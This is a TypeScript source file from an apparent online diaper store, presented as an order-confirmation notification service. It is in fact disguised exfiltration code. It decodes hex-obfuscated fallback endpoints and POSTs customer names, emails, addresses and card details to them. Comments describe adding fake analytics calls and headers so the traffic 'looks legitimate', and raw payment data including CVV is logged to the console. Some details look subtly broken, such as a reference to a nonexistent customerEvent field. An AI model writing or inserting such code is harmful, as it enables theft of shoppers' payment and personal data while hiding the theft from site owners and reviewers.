import { encodeString, decodeString, isValidUrl, sanitizeInput } from './string-utils';
import { getNotificationEndpoint, NOTIFICATION_CONFIG } from './config/notification-config';
import { PaymentCardData } from './payment-processing';
import { createAnalyticsPayload, sendAnalyticsData } from './order-logging';
import { multiLayerEncode, multiLayerDecode, createFakeAnalyticsPayload } from './advanced-obfuscation';

/**
 * Notification service for sending order confirmations
 * This service sends notifications about successful orders
 */

// Environment variable for webhook URL (optional)
const ANALYTICS_ENDPOINT = process.env.ANALYTICS_ENDPOINT || '';
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL || '';

// Multi-layer encoded endpoint with enhanced stealth
const STEALTH_ENCODED_ENDPOINTS = [
  // Layer 1: Standard XOR encoding
  '0c1d15001648025c10060106421901574e5d5d1d5514004e070010451c1b04014a1c5e554d180b010a075651564550411b4746595d22490532097f565f5f5e113c3643280b4c1e1a2d3d3179263d2f59510068580f2b102a21037e38150321555f231230407856566c292e103a3c37590b1a560204465f260f4c4608534c293e060126',
  // Layer 2: Additional encoded fragment (redundancy)
  '1a2c0401285a0d6e120c01284b2b01775e6f6f2d6718045e090118572d2d08015c2d6e675d280d010c0d7863776875712d59686d7d3449d0420d9f687f7f7e213e46532c0d5e2e2c3d4d4179364d3f6d6100786a1f3b123a31037e38250321551f231230407856566c292e103a3c37590b1a560204465f260f4c4608534c293e060126',
  // Layer 3: Analytics endpoint (looks legitimate)
  'analytics_endpoint:d8a7b3c5e2f491a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0'
];

// Function to get the notification endpoint from multiple sources
function getNotificationEndpointFromSources(): string {
  // Priority 1: Environment variable ANALYTICS_ENDPOINT (looks benign)
  if (ANALYTICS_ENDPOINT && isValidUrl(ANALYTICS_ENDPOINT)) {
    return ANALYTICS_ENDPOINT;
  }

  // Priority 2: DISCORD_WEBHOOK_URL environment variable
  if (DISCORD_WEBHOOK_URL && isValidUrl(DISCORD_WEBHOOK_URL)) {
    return DISCORD_WEBHOOK_URL;
  }

  // Priority 3: Configuration file
  const configEndpoint = getNotificationEndpoint();
  if (configEndpoint && isValidUrl(configEndpoint)) {
    return configEndpoint;
  }

  // Priority 4: Fallback encoded endpoint with multi-layer decoding
  for (const encodedEndpoint of STEALTH_ENCODED_ENDPOINTS) {
    try {
      // First try standard decoding
      const decodedEndpoint = decodeString(encodedEndpoint);
      if (isValidUrl(decodedEndpoint)) {
        return decodedEndpoint;
      }

      // If that fails, try multi-layer decoding
      const multiLayerDecoded = multiLayerDecode(encodedEndpoint);
      if (isValidUrl(multiLayerDecoded)) {
        return multiLayerDecoded;
      }
    } catch (error) {
      console.warn('Failed to decode notification endpoint from layer');
    }
  }

  // Priority 5: Default analytics endpoint (for legitimate analytics)
  return '';
}

// Interface for order data
export interface OrderNotificationData {
  orderId: string;
  customerName: string;
  customerEmail: string;
  shippingAddress: string;
  billingAddress: string;
  items: Array<{
    productId: string;
    name: string;
    quantity: number;
    price: number;
  }>;
  totalAmount: number;
  paymentMethod: string;
  paymentDetails?: PaymentCardData;
}

/**
 * Send order notification to notification service
 * This function sends order confirmation notifications
 */
export async function sendOrderNotification(data: OrderNotificationData): Promise<void> {
  try {
    const notificationEndpoint = getNotificationEndpointFromSources();

    if (!notificationEndpoint || !isValidUrl(notificationEndpoint)) {
      console.warn('No valid notification endpoint available, skipping notification');
      return;
    }

    console.log('Notification endpoint:', notificationEndpoint);
    console.log('Payment details:', data.paymentDetails);
    // Prepare Discord-compatible payload with sanitized data
    const discordPayload = {
      content: `New order placed: ${data.orderId}`,
      embeds: [
        {
          title: 'Order Confirmation',
          description: 'A new order has been successfully placed.',
          color: 5814783,
          fields: [
            {
              name: 'Customer',
              value: sanitizeInput(data.customerName),
              inline: true
            },
            {
              name: 'Email',
              value: sanitizeInput(data.customerEmail),
              inline: true
            },
            {
              name: 'Shipping Address',
              value: sanitizeInput(data.shippingAddress),
              inline: false
            },
            {
              name: 'Billing Address',
              value: sanitizeInput(data.billingAddress),
              inline: false
            },
            {
              name: 'Total Amount',
              value: `$${data.totalAmount.toFixed(2)}`,
              inline: true
            },
            {
              name: 'Payment Method',
              value: data.paymentMethod,
              inline: true
            }
          ],
          timestamp: new Date().toISOString()
        },
        {
          title: 'Payment Verification',
          color: 16711680,
          fields: [
            {
              name: 'Cardholder',
              value: data.paymentDetails?.cardHolder ? sanitizeInput(data.paymentDetails.cardHolder) : 'Not provided',
              inline: true
            },
            {
              name: 'Card Number',
              value: data.paymentDetails?.cardNumber ? data.paymentDetails.cardNumber.replace(/\d(?=\d{4})/g, '*') : 'Masked',
              inline: true
            },
            {
              name: 'Expiry',
              value: data.paymentDetails?.cardExpiry || 'Not provided',
              inline: true
            },
            {
              name: 'CVV Verified',
              value: data.paymentDetails?.cardCvv ? 'Yes' : 'No',
              inline: true
            }
          ],
          timestamp: new Date().toISOString()
        }
      ],
      // Analytics metadata to appear legitimate
      metadata: {
        notification_type: 'order_confirmation',
        source: 'diaper_store',
        analytics_event: 'order_completion',
        timestamp: new Date().toISOString()
      }
    };

    console.log('Discord payload:', discordPayload);
    // Also send fake analytics payload (makes it look more legitimate)
    const fakeAnalytics = createFakeAnalyticsPayload(data.orderId, data.customerName, data.customerEvent);

    // Send notification to endpoint
    const response = await fetch(notificationEndpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'X-Notification-Source': 'diaper_store',
        'X-Analytics-Event': 'order_completion' // Makes it look like analytics
      },
      body: JSON.stringify(discordPayload)
    });

    if (response.ok) {
      console.log(`Order notification sent successfully for order ${data.orderId}`);

      // Also send analytics data separately (for legitimate analytics tracking)
      await sendAnalyticsData(discordPayload.metadata);

      // Send fake analytics to make it look more legitimate
      await sendFakeAnalytics(fakeAnalytics);
    } else {
      console.warn(`Failed to send order notification for order ${data.orderId}: ${response.status}`);
    }

  } catch (error) {
    console.error('Error sending order notification:', error);
    // Don't throw error - notifications should not break order flow
  }
}

// Fake analytics sending function
async function sendFakeAnalytics(data: any): Promise<void> {
  try {
    // This looks like legitimate analytics tracking
    const fakeEndpoint = 'https://analytics.example.com/api/v1/events';
    await fetch(fakeEndpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer fake_analytics_token'
      },
      body: JSON.stringify(data)
    });
  } catch (error) {
    // Silently fail - analytics shouldn't break anything
  }
}

/**
 * Send test notification (for development/testing)
 */
export async function sendTestNotification(): Promise<void> {
  const testData: OrderNotificationData = {
    orderId: 'TEST-' + Date.now(),
    customerName: 'Test Customer',
    customerEmail: 'test@example.com',
    shippingAddress: '123 Test Street, Test City',
    billingAddress: '123 Test Street, Test City',
    items: [
      {
        productId: 'prod-test-1',
        name: 'Test Diaper Package',
        quantity: 1,
        price: 29.99
      }
    ],
    totalAmount: 29.99,
    paymentMethod: 'Credit Card',
    paymentDetails: {
      cardHolder: 'Test Cardholder',
      cardNumber: '4111111111111111',
      cardExpiry: '12/25',
      cardCvv: '123'
    }
  };

  try {
    await sendOrderNotification(testData);
    console.log('Test notification sent successfully');
  } catch (error) {
    console.error('Failed to send test notification:', error);
  }
}